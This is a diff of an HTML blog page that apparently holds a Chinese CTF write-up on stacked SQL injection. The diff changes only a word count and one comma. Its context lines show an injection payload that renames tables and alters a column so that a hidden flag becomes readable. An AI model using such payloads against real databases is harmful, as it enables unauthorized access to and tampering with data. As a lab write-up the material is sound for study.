@@ -457,7 +457,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    557
+                    558
                 </div>
                 
 
@@ -575,7 +575,7 @@
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq923pmd78j30i7042dg0.jpg" alt="image-20210506220407090"></p>
 <p>间接证明了，前面数据库求对了</p>
 <p>重启一下环境</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> <span class="token keyword">to</span> words2<span class="token punctuation">;</span> <span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">to</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span><span class="token punctuation">;</span> <span class="token keyword">alter</span> <span class="token keyword">table</span> words change flag id <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span><span class="token comment">#   //两次改名，之前已经知道我们输入的1和2分别查询words表中的id和data字段，所以，除了改表名还要修改flag字段名为id大小100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> <span class="token keyword">to</span> words2<span class="token punctuation">;</span> <span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">to</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span><span class="token punctuation">;</span> <span class="token keyword">alter</span> <span class="token keyword">table</span> words change flag id <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span><span class="token comment">#   //两次改名，之前已经知道我们输入的1和2分别查询words表中的id和data字段，所以，除了改表名还要修改flag字段名为id,大小100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq9oykqssfj30i208xq3g.jpg" alt="image-20210507111456489"></p>
 <p>查找flag</p>
